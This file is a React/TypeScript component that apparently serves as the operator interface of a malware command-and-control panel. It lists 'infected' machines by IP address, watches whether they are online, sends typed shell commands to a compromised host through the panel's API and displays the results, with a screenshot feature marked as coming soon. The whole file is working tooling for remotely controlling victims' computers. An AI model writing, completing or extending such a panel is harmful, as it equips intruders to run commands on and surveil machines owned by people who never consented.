import React, { Fragment, useEffect, useState } from "react"
import { useNavigate, useParams } from "react-router";
import type { Infected } from "../types/infected.ts";
import api from "../api/baseUrl.ts";
import { useTitle } from "../hooks/useTitle.ts";
import { useStore } from "../hooks/useStore.ts";
import type { InfectedStatus } from "../sse.ts";
import { IoIosArrowBack } from "react-icons/io";

interface Output {
    stdout: string,
    stderr: string,
    statusCode: number
}

interface CommandResult {
    input: string,
    output: Output
}

export const InfectedWorkSpace: React.FC = () => {
    const { iid } = useParams();
    const navigate = useNavigate();
    const [infected, setInfected] = useState<Infected>();
    const { findByIID, infected: infLoaded } = useStore();
    const [page, setPage] = useState<'command' | 'screenshot'>('command');
    const [commandResults, setCommandResults] = useState<CommandResult[]>([]);
    const [input, setInput] = useState<string>("");
    useTitle("Infected Work Space");

    useEffect(() => {
        if (infLoaded.length == 0 || !findByIID(iid!)) {
            navigate('/')
        }

        setInfected(findByIID(iid!));
    }, []);

    useEffect(() => {
        const sseHandler = ((e: CustomEvent) => {
            const { detail: infectedStatus }: { detail: InfectedStatus } = e;

            if (infectedStatus.iid == iid!) {
                if (!infectedStatus.online) {
                    console.log(`${iid} disconnected!`);
                    navigate('/');
                }
            }
        }) as EventListener;

        window.addEventListener('infected-status', sseHandler)

        return () => window.removeEventListener('infected-status', sseHandler);
    }, [])

    const handleSendCommand = async () => {
        if (!input.trim()) return;

        const res = await api.post(`/infected/command/${infected?.iid}`, {
            command: input
        });

        console.log(res);

        setCommandResults((prev) => [
            ...prev,
            {
                input,
                output: res.data
            }
        ]);
        setInput("");
    };

    return (
        <div className="flex flex-col h-full">
            <div className="flex w-full items-center justify-start gap-5 p-4">
                <button className="btn btn-ghost rounded-full" onClick={() => navigate('/infected')}>
                    <IoIosArrowBack />
                </button>
                <h2 className="card-title text-lg font-mono">{infected?.latestIpAddress}</h2>
                <span className="font-mono p-1 bg-green-400 rounded-md text-white">Online</span>
            </div>
            <div className={"flex w-full h-full grow min-h-0 p-4"}>
                <div className={"flex flex-col space-y-4 pr-4"}>
                    {page == 'screenshot' ?
                        <button className={"btn btn-lg btn-primary text-white mb-4"} onClick={() => { setPage('command') }}>Command-Line</button>
                        :
                        <button className={"btn btn-lg bg-[#b17fff] text-white mb-4"} onClick={() => { setPage('command') }}>Command-Line</button>
                    }
                    {page == 'command' ?
                        <button className={"btn btn-lg btn-primary text-white mb-4"} onClick={() => { setPage('screenshot') }}>Screenshot</button>
                        :
                        <button className={"btn btn-lg bg-[#b17fff] text-white mb-4"} onClick={() => { setPage('screenshot') }}>Screenshot</button>
                    }
                </div>
                {
                    page === 'command' &&
                    <div className="flex flex-col grow h-full min-h-0">
                        <div className="flex-1 min-h-0 bg-gray-900 rounded-t-xl p-4 shadow-inner overflow-hidden">
                            <div className="h-full overflow-y-auto pr-2 space-y-2 flex flex-col justify-end">
                                {commandResults.map(({ input: cmdInput, output }, i) => {
                                    let styleBase = "whitespace-pre-wrap text-lg font-medium font-mono w-full ";
                                    return (
                                        <Fragment key={i}>
                                            <p className={styleBase + "text-white"}>$ {cmdInput}</p>
                                            <p className={
                                                `${styleBase} ${output.stderr != ''
                                                    ? 'text-red-400'
                                                    : 'text-white'
                                                }`
                                            }>
                                                {
                                                    output.stderr != ''
                                                        ? output.stderr
                                                        : output.stdout
                                                }
                                            </p>
                                            {
                                                output.statusCode &&
                                                <p className={styleBase + "text-red-400"}>exit {output.statusCode}</p>
                                            }
                                        </Fragment>
                                    )
                                })}
                            </div>
                        </div>
                        <input
                            type="text"
                            placeholder="Type your command"
                            value={input}
                            onChange={(e) => setInput(e.target.value)}
                            onKeyDown={(e) => {
                                if (e.key === "Enter") {
                                    handleSendCommand()
                                }
                            }}
                            className="w-full p-4 shrink-0 font-mono bg-gray-900 rounded-b-xl text-lg outline-none text-white placeholder-white focus:bg-slate-gray-700 transition-colors"
                        />
                    </div>
                }
                {
                    page === 'screenshot' &&
                    <div>
                        <h1>Coming soon!</h1>
                    </div>
                }
            </div>
        </div>
    )
}
